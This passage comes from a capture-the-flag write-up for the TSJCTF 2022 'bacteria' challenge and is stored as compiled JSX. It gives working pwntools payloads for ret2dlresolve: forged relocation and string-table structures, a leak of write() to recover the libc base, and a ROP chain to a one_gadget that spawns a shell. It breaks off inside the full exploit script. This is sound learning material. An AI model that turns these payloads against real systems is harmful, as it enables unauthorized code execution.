debuging:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/tsjctf-2022/bacteria/check_reloc_arg.png\",alt:\"check_reloc_arg.png\"})}),`\n`,(0,e.jsx)(n.p,{children:\"We can see that it send 0x20 bytes which fit read() so we are sure that every payload is sent correctly. Let\\u2019s run until we have inputed all struct and check with the reloc_arg:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/tsjctf-2022/bacteria/check_structures_position.png\",alt:\"check_structures_position.png\"})}),`\n`,(0,e.jsx)(n.p,{children:\"We can see that all of our struct are in the correct position. Now we just need an address of r_offset to puts the resolved function to it. We want when it has just resolved, it will print out the resolved address immediately. Which means when we have just write STRTAB structure, we will write the dlresolver to r_offset. After it resolve, it will print out the libc address which rsi is holding the pointer.\"}),`\n`,(0,e.jsxs)(n.p,{children:[\"So the dlresolver and r_offset is in the same address. Because we don\\u2019t want the JMPREL, SYMTAB and STRTAB structure to be overwriten or it might cause error. And also because dlresolve will use the lower stack address to resolve this so choosing lower address is an great idea. We will use address of \",(0,e.jsx)(n.code,{children:\"rw_section - 0x50\"}),\" for both r_offset and dlresolver so the stage 3 will change to this:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"JMPREL \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400300\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Elf64_Rela_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" rw_section \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x40\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"reloc_arg \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"int\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"Elf64_Rela_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\" JMPREL\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"/\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"24\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"r_offset \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"rw_section \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x50\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"         \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Change here\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"r_info \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"symbol_number \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\u003c\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"32\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x7\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# r_addend is null and stack is null already so we don\\u2019t need to write this,\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# also because we run out of 0x10 bytes we can write\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Elf64_Rela_struct \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" r_offset \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),` r_info\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"And the rbp when writing STRTAB structure become this:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Write STRTAB structure\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"rw_section \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x50\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"         \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Fake rbp, write and jump to ret2dlresolve address\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"mov_rsi_rbp_read\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),` STRTAB_struct\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"send\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"Everything is set! Now we will conduct the ret2dlresolve by faking reloc_arg. To do that, we will need 3 things placed on stack: dlresolver address, reloc_arg and return address. The dlresolver address we can get by analize the read@plt:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/tsjctf-2022/bacteria/analize_read_plt.png\",alt:\"analize_read_plt.png\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"So the dlresolver address is \",(0,e.jsx)(n.code,{children:\"0x401000\"}),\", the reloc_arg is \",(0,e.jsx)(n.code,{children:\"632\"}),\" above and the return address of course is \",(0,e.jsx)(n.code,{children:\"mov_rsi_rbp_read\"}),\" because we will need to input something more.\"]}),`\n`,(0,e.jsx)(n.p,{children:\"After it writes STRTAB structure and jump to there, it then write to ret2dlresolve stack address and jump to ret2dlresolve address. With everything we have, the payload will look like this:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"dlresolver \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x401000\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"                         \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Fake rbp\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"dlresolver\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"               \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Resolve then execute resolved function\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"reloc_arg\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"mov_rsi_rbp_read\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"send\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Wait! The hint was we can use \",(0,e.jsx)(n.code,{children:\"write(0, buf, numofbyte)\"}),\" to print things out (rdi is always 0) so in the STRTAB structure, we will change from \",(0,e.jsx)(n.code,{children:\"system\"}),\" to \",(0,e.jsx)(n.code,{children:\"write\"}),\" to print out the resolved libc address. This is the updated of STRTAB structure:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"STRTAB \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x4002c0\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"STRTAB_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" rw_section \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x80\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"st_name \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" STRTAB_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),` STRTAB\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"STRTAB_struct \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'b\"write\\\\x00\\\\x00\\\\x00\"'}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"STRTAB_struct \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"Running script to here and debug with gdb, we know we ret2dlresolve successfully:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/tsjctf-2022/bacteria/get_write_libc_function.png\",alt:\"get_write_libc_function.png\"})}),`\n`,(0,e.jsx)(n.p,{children:\"This is the function write in libc. Let\\u2019s check if the rsi contain the address point to r_offset or not:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/tsjctf-2022/bacteria/rsi_contain_write_libc_address.png\",alt:\"rsi_contain_write_libc_address.png\"})}),`\n`,(0,e.jsx)(n.p,{children:\"And here it is! Running through the write function and we get the address of write leaked:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/tsjctf-2022/bacteria/write_address_leaked.png\",alt:\"write_address_leaked.png\"})}),`\n`,(0,e.jsx)(n.p,{children:\"Getting that leak and parsing it with the following code, we can get the libc base address:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Get leaked address\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"write_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" u64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"recv\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"8\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"log\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"success\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'Leak address: '\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"hex\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"write_addr\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"libc_base \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" write_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x1111d0\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"log\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"success\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'Libc base: '\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"hex\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"libc_base\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"Running script and we get this output:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/tsjctf-2022/bacteria/get_libc_base.png\",alt:\"get_libc_base.png\"})}),`\n`,(0,e.jsx)(n.p,{children:\"Check with libc in GDB and we get the same address:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/tsjctf-2022/bacteria/get_libc_base_GDB.png\",alt:\"get_libc_base_GDB.png\"})}),`\n`,(0,e.jsx)(n.p,{children:\"What a long way! Let\\u2019s keep going cause we are very close to flag.\"}),`\n`,(0,e.jsxs)(n.h3,{id:\"stage-6-get-shell\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#stage-6-get-shell\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Stage 6. Get shell\"]}),`\n`,(0,e.jsx)(n.p,{children:\"Now we will get the libc from container to our host and then find one gadget from it:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"$ \",(0,e.jsx)(n.span,{className:\"token function\",children:\"docker\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"ps\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`CONTAINER ID   IMAGE               COMMAND                  CREATED        STATUS       PORTS                    NAMES\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"3ac3689e6140   bacteria_bacteria   \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"/usr/sbin/xinetd -d\\u2026\"'}),\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"12\"}),\" hours ago   Up \",(0,e.jsx)(n.span,{className:\"token number\",children:\"3\"}),\" hours   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0.0\"}),\".0.0:9487-\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"9487\"}),`/tcp   bacteria_bacteria_1\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"$ \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# docker cp \u003cCONTAINER ID\u003e:\u003cpath/of/container\u003e \u003cpath/of/host/machine\u003e\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"$ \",(0,e.jsx)(n.span,{className:\"token function\",children:\"docker\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"cp\"}),\" 3ac3689e6140:/usr/lib/x86_64-linux-gnu/libc-2.31.so \",(0,e.jsx)(n.span,{className:\"token builtin class-name\",children:\".\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Using \",(0,e.jsx)(n.code,{children:\"one_gadget\"}),\" and we have the following gadget:\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/tsjctf-2022/bacteria/one_gadget.png\",alt:\"one_gadget.png\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"We will use the first one which has constraints are r12 and r15 have to be null. Examine the register and we can see that r15 is null already, all we need now is r12 have to be null. Everything is easy when we have libc. Using \",(0,e.jsx)(n.code,{children:\"ROPgadget\"}),\" and we can get this:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"$ ROPgadget --binary libc-2.31.so --ropchain \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"grep\"}),\" xor \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"grep\"}),\" r12 \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"grep\"}),` ret\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"..\"}),`.\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"..\"}),`.\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"0x00000000000d31f0 \",(0,e.jsx)(n.span,{className:\"token builtin class-name\",children:\":\"}),\" xor r12d, r12d \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\" mov rax, r12 \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\" pop r12 \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),` ret\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"We will use this to clear the r12. I use xor because we don\\u2019t need to add those \",(0,e.jsx)(n.code,{children:\"p64(0)\"}),\" then pop in a limited space like this situation. Before we continue, let choose any address for rbp in the write of ret2dlresolve so that it will jump to there after the leak. I will choose the rw_section (because now we don\\u2019t need stack more) so the code for ret2dlresolve will look like this:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Conduct ret2dlresolve\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"dlresolver \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x401000\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"rw_section\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"           \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Fake rbp, choose random writable address\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"dlresolver\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"          \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Dlresolver\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"reloc_arg\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"           \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Fake reloc_arg\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"mov_rsi_rbp_read\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"    \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Return address\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"send\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"And now, after the leak it will get input from us again. Just pass that xor 12 and one gadget, we created the shell:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"one_gadget \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0xe6c7e\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"xor_r12_pop_r12 \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0xd31f0\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"                               \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Fake rbp, not use more\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"libc_base \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" xor_r12_pop_r12\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"    \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# rip\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"                              \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# For that pop r12\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"libc_base \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" one_gadget\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"         \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Return address\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"send\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"interactive\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"Full code:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"import\"}),` subprocess\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"import\"}),` time\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"from\"}),\" pwn \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"import\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"context\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"binary \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" exe \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" ELF\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'./bacteria'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" checksec\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token boolean\",children:\"False\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# context.log_level = 'debug'\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"GDB\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\tproc \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" subprocess\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"Popen\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'ps'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'aux'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" stdout\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\"subprocess\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"PIPE\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\tps \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" proc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"stdout\",(0,e.jsx)(n.span,{className:\"token 